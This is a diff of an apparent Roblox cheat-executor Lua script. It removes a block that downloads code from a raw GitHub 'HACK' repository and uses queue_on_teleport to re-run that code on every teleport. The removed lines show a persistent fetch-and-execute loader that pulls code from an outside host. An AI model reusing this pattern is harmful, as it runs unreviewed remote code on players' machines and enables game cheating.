@@ -1,28 +1,3 @@
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local lp = Players.LocalPlayer
-
-local SCRIPT_URL = "https://raw.githubusercontent.com/cichonowek/HACK/refs/heads/master/log.txt"
-
-local function Queue()
-    if queue_on_teleport then
-        queue_on_teleport(game:HttpGet(SCRIPT_URL))
-    end
-end
-
--- kolejkuj OD RAZU
-Queue()
-
--- kolejkuj PRZY KAŻDYM TELEPORCIE (Delta fix)
-TeleportService.OnTeleport:Connect(function(state)
-    if state == Enum.TeleportState.Started then
-        Queue()
-    end
-end)
-
-if queue_on_teleport then queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/cichonowek/HACK/refs/heads/master/log.txt")) end
-
-
 local CoreGui = game:GetService("CoreGui")
 
 if CoreGui:FindFirstChild("MobileActivatorGUI") then
